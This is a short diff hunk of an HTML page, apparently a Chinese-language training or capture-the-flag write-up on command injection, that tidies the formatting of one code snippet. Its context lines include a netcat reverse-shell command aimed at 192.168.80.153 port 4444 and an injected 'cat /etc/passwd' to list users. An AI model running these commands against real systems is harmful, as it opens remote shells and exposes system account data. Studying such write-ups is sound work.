@@ -903,7 +903,7 @@
 &lt;p&gt;&lt;strong&gt;拓展：&lt;/strong&gt; 也可以传入webshell回弹命令&lt;code&gt;nc+-e+/bin/bash+192.168.80.153+4444&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;需要提前打开na监听4444端口&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;我们修改命令查看一下有哪些用户：&lt;code&gt;&amp;lt;font style=&amp;quot;color:rgb(51, 51, 51);&amp;quot;&amp;gt;cat /etc/passwd&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;我们修改命令查看一下有哪些用户：&lt;code&gt;cat /etc/passwd&lt;/code&gt;&lt;/p&gt;
 &lt;!-- 这是一张图片，ocr 内容为： --&gt;
 &lt;p&gt;&lt;img src=&#34;https://www.retr0.xyz/post/26%e5%af%92%e5%81%87%e9%9b%86%e8%ae%ad/pic/2.6-1/010.png&#34;
 	
